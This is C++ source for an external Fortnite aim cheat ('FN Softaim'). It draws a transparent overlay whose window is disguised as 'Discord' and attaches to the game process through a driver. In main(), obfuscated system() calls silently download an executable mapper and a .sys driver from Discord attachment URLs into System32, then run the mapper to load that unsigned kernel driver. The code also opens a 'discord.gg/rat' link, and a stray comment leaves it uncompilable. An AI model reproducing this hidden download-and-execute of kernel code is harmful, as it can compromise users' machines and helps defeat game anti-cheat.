	p_Device->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);
	if (p_Device->BeginScene() >= 0)
	{
		ImGui::Render();
		ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
		p_Device->EndScene();
	}
	HRESULT result = p_Device->Present(NULL, NULL, NULL, NULL);

	if (result == D3DERR_DEVICELOST && p_Device->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
	{
		ImGui_ImplDX9_InvalidateDeviceObjects();
		p_Device->Reset(&p_Params);
		ImGui_ImplDX9_CreateDeviceObjects();
	}
}

HRESULT DirectXInit(HWND hWnd)
{
	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
		exit(3);

	ZeroMemory(&p_Params, sizeof(p_Params));
	p_Params.Windowed = TRUE;
	p_Params.SwapEffect = D3DSWAPEFFECT_DISCARD;
	p_Params.hDeviceWindow = hWnd;
	p_Params.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	p_Params.BackBufferFormat = D3DFMT_A8R8G8B8;
	p_Params.BackBufferWidth = Width;
	p_Params.BackBufferHeight = Height;
	p_Params.EnableAutoDepthStencil = TRUE;
	p_Params.AutoDepthStencilFormat = D3DFMT_D16;
	p_Params.PresentationInterval = D3DPRESENT_INTERVAL_IMMEDIATE;

	if (FAILED(p_Object->CreateDeviceEx(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, hWnd, D3DCREATE_HARDWARE_VERTEXPROCESSING, &p_Params, 0, &p_Device)))
	{
		p_Object->Release();
		exit(4);
	}

	IMGUI_CHECKVERSION();
	ImGui::CreateContext();
	ImGui::GetIO().Fonts->AddFontDefault();
	ImGuiIO& io = ImGui::GetIO(); (void)io;
	io.Fonts->AddFontFromFileTTF(E("C:\\Windows\\Fonts\\Micross.ttf"), 13.f);


	static const ImWchar ranges[] =
	{
		0x0020, 0x00FF,
		0x0400, 0x044F,
		0,
	};


	ImGui_ImplWin32_Init(hWnd);
	ImGui_ImplDX9_Init(p_Device);

	return S_OK;
}

void CleanuoD3D()
{
	if (p_Device != NULL)
	{
		p_Device->EndScene();
		p_Device->Release();
	}
	if (p_Object != NULL)
	{
		p_Object->Release();
	}
}

void SetWindowToTarget()
{
	while (true)
	{
		GameWnd = get_process_wnd(process_id);
		if (GameWnd)
		{
			ZeroMemory(&GameRect, sizeof(GameRect));
			GetWindowRect(GameWnd, &GameRect);
			Width = GameRect.right - GameRect.left;
			Height = GameRect.bottom - GameRect.top;
			DWORD dwStyle = GetWindowLong(GameWnd, GWL_STYLE);
			if (dwStyle & WS_BORDER)
			{
				GameRect.top += 32;
				Height -= 39;
			}
			ScreenCenterX = Width / 2;
			ScreenCenterY = Height / 2;
			MoveWindow(hwnd, GameRect.left, GameRect.top, Width, Height, true);
		}
	}
}
void SetupWindow()
{
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SetWindowToTarget, 0, 0, 0);

	WNDCLASSEXA wcex = {
		sizeof(WNDCLASSEXA),
		0,
		DefWindowProcA,
		0,
		0,
		nullptr,
		LoadIcon(nullptr, IDI_APPLICATION),
		LoadCursor(nullptr, IDC_ARROW),
		nullptr,
		nullptr,
		("Discord"),
		LoadIcon(nullptr, IDI_APPLICATION)
	};

	RECT Rect;
	GetWindowRect(GetDesktopWindow(), &Rect);

	RegisterClassExA(&wcex);

	MyWnd = CreateWindowExA(NULL, E("Discord"), E("Discord"), WS_POPUP, Rect.left, Rect.top, Rect.right, Rect.bottom, NULL, NULL, wcex.hInstance, NULL);
	SetWindowLong(MyWnd, GWL_EXSTYLE, WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW);
	SetLayeredWindowAttributes(MyWnd, RGB(0, 0, 0), 255, LWA_ALPHA);
	//SetWindowDisplayAffinity(MyWnd, 1);

	MARGINS margin = { -1 };
	DwmExtendFrameIntoClientArea(MyWnd, &margin);

	ShowWindow(MyWnd, SW_SHOW);
	UpdateWindow(MyWnd);
}

extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
		return true;

	switch (Message)
	{
	case WM_DESTROY:
		CleanuoD3D();
		PostQuitMessage(0);
		exit(4);
		break;
	case WM_SIZE:
		if (p_Device != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			p_Params.BackBufferWidth = LOWORD(lParam);
			p_Params.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = p_Device->Reset(&p_Params);
			if (hr == D3DERR_INVALIDCALL)
				IM_ASSERT(0);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
		break;
	}
	return 0;
}

WPARAM MainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, MyWnd, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();
		if (GetAsyncKeyState(0x23) & 1)
			exit(8);

		if (hwnd_active == GameWnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(MyWnd, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}
		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(GameWnd, &rc);
		ClientToScreen(GameWnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = GameWnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(0x1)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else
			io.MouseDown[0] = false;
		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
		{

			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			p_Params.BackBufferWidth = Width;
			p_Params.BackBufferHeight = Height;
			SetWindowPos(MyWnd, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			p_Device->Reset(&p_Params);
		}
		Render();
	}
	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();



	CleanuoD3D();
	DestroyWindow(MyWnd);

	return Message.wParam;
}

/*
void StartupFailed(const char* ErrorCode, const char* Symbol)
{
	const char* error = ErrorCode;
	const char* symbol = Symbol;
	Sleep(500);
	system("cls");
	std::cout << "\n " << ErrorCode << Symbol << " did not return";
	Sleep(2000);
	system("cls");
	printf("\n Exiting in 10 seconds");
	Sleep(10000);
	exit(0);
}
*/

int main()
{
	SetConsoleTitleA("FN Softaim"); // <- insert your brand or smthn
	std::cout << "\n";
	printf(" Loading softaim");
	Sleep(2000);
	system("cls");
	if (driver->Init(FALSE)) {
		printf("\nLOADING DRIVER.");
		Sleep(500);
		system("cls");
		printf("LOADING DRIVER..");
		Sleep(500);
		system("cls");
		printf("LOADING DRIVER...");
		Sleep(500);
		system("cls");
		printf("LOADING DRIVER....");
		Sleep(500);
		system("cls");
		// system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1054889128363311118/1054889326632239157/kdmapper.exe --output C:\\Windows\\System32\\KDMapper.exe >nul 2>&1").c_str());
		system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1054577655468535828/1054578151533056010/Vanguardmapper.exe --output C:\\Windows\\System32\\KDMapper.exe >nul 2>&1").c_str());
		system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1047990317732859945/1054129973830627338/drvmoment.sys --output C:\\Windows\\System32\\drvmoment.sys >nul 2>&1").c_str());
		system(_xor_("cls").c_str());
		system(_xor_("cd C:\\Windows\\System32\\").c_str());
		system(_xor_("C:\\Windows\\System32\\KDMapper.exe C:\\Windows\\System32\\drvmoment.sys").c_str());
		Sleep(1000);
		printf("\n DRIVER LOADED\n\n");
		Sleep(500);
		while (hwnd == NULL)
		{
			XorS(wind, "Fortnite  ");
			hwnd = FindWindowA(0, wind.decrypt());
			if (hwnd == NULL) { printf("Error Fortnite not found\n"); }
			Sleep(100);
		}
		system("cls");
		printf("LOADING CHEAT MODULE.");
		Sleep(500);
		system("cls");
		printf("LOADING CHEAT MODULE..");
		Sleep(500);
		system("cls");
		printf("LOADING CHEAT MODULE...");
		Sleep(500);
		system("cls");
		printf("LOADING CHEAT MODULE...");
		Sleep(500);
		system("cls");
		printf("LOADING CHEAT MODULE....");
		// GetWindowThreadProcessId(hwnd, &process_id); <- meh
		process_id = driver->GetProcessId((L"FortniteClient-Win64-Shipping.exe"));
		driver->Attach(process_id);
		base_address = driver->GetModuleBase(L"FortniteClient-Win64-Shipping.exe");
		SetupWindow();
		DirectXInit(MyWnd);
	  // if (process_id == NULLED) { StartupFailed("Error 1338: ", "Proccess ID"); }
		// if (base_address == NULLED) { StartupFailed("Error 1339: ", "Base Address"); }
		// CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(Actors), nullptr, NULL, nullptr);
		Sleep(500);
		system("cls");
		printf("LOADED MODULE");
		Sleep(1000);
		system("cls");
		Sleep(500);
		printf("\n MODULE BASE ATTACHED \n");
		Sleep(700);
		printf(" PROCCES ID ATTACHED \n");
		Sleep(700);
		printf(" LOOP DRAWN \n");
		Sleep(700);
		printf(" OVERLAY INITED \n");
		Sleep(700);
		printf(" CHEAT : LOADED \n\n");
		Sleep(700);
		system("start https://discord.gg/rat"); <- Insert your discord vantiy 
		printf(E(" BaseAddress :0x%llX\n"), base_address);
		printf(E(" ProccessID :0x%llX\n"), base_address);
		printf("\n Fn External : Chapter 4 Season 1 V23.10 Windows 10 64-bit");

		MainLoop();
		FocusedgameWindow(hwnd); // wnd check
		return 0;
	}
  
	printf(("Failed!\n"));
	system(("pause"));
	return 1;
}
